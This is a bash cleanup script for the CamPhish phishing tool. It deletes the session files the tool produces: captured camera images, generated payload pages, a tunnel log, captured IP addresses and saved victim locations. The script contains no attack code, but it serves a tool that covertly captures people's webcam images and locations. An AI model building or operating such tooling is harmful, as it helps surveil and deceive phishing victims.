#!/usr/bin/env bash
# CamPhish cleanup script
# Removes runtime-generated files — safe to run between sessions

# Safety: confirm we are inside the CamPhish project directory
if [[ ! -f "camphish.sh" ]]; then
    echo "[!] Run this script from inside the CamPhish directory."
    exit 1
fi

echo "[*] Starting CamPhish cleanup..."

# Captured camera images
echo "    Removing captured images..."
rm -f cam*.png

# Runtime payload files (generated by sed at startup — NOT the source templates)
echo "    Removing generated payload files..."
rm -f index2.html index3.html
# NOTE: index.php is intentionally kept — it is the source template copy.
# Only remove it if you want a full reset (will be rebuilt on next run).

# Tunnel log
echo "    Removing tunnel log..."
rm -f .cloudflared.log

# PHP / detection logs
echo "    Removing runtime logs..."
rm -f Log.log

# IP capture file (already appended to saved.ip.txt by the tool)
echo "    Removing session ip.txt..."
rm -f ip.txt

# Safely remove files in saved_locations/ without a glob-on-empty-dir error
if [[ -d "saved_locations" ]]; then
    echo "    Cleaning saved_locations/..."
    find saved_locations/ -maxdepth 1 -type f -delete
fi

echo "[✓] Cleanup complete."
